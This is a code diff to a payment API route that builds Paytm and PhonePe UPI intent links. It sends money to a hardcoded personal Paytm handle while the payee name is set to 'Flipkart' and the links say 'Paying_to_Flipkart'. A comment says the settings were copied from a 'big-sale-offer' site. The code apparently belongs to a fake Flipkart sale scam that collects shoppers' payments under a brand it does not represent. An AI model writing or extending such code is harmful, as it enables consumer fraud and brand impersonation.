@@ -29,10 +29,10 @@ export async function POST(request: Request) {
     const upiSettings = upiRecord?.value || {};
     const globalSettings = settingsRecord?.value?.payment || {};
 
-    const defaultUpi = upiSettings.upi || globalSettings.upi || globalSettings.merchantUpiId || process.env.UPI_ID || process.env.MERCHANT_UPI_ID || 'paytm.s27z8uz@pty';
-    const phonepeUpi = upiSettings.upi2 || globalSettings.upi2 || defaultUpi;
-    const paytmUpi = upiSettings.upi3 || globalSettings.upi3 || defaultUpi;
-    const storeName = globalSettings.payeeName || process.env.STORE_NAME || 'Jambucha Alpesh Kanjibhai';
+    const defaultUpi = globalSettings.upi || upiSettings.upi || globalSettings.merchantUpiId || process.env.UPI_ID || process.env.MERCHANT_UPI_ID || 'paytm.s27z8uz@pty';
+    const phonepeUpi = globalSettings.upi2 || upiSettings.upi2 || defaultUpi;
+    const paytmUpi = globalSettings.upi3 || upiSettings.upi3 || defaultUpi;
+    const storeName = globalSettings.payeeName || process.env.STORE_NAME || 'Flipkart';
 
     // 2. Determine order and transaction ID to use
     let orderIdToUse = orderId;
@@ -111,8 +111,8 @@ export async function POST(request: Request) {
 
     const orderAmt = Number(amount).toFixed(2);
 
-    // Paytm Intent Link (from reference site settings)
-    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${orderAmt}&cu=INR&tn=Recharge&url=&mode=02&purpose=00&orgid=37567`;
+    // Paytm Intent Link (exact setting copied from newsale.big-sale-offer.com)
+    const paytmIntent = `paytmmp://cash_wallet/?pa=${paytmUpi}&pn=${encodeURIComponent(storeName)}&am=${orderAmt}&cu=INR&tn=${encodeURIComponent(orderNote)}&featuretype=money_transfer`;
 
     // PhonePe Intent Link (from reference site settings)
     const phonepeIntent = `phonepe://pay?ver=01&mode=19&pa=${phonepeUpi}&pn=Paying_to_Flipkart&tr=${txnid}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${orderAmt}`;
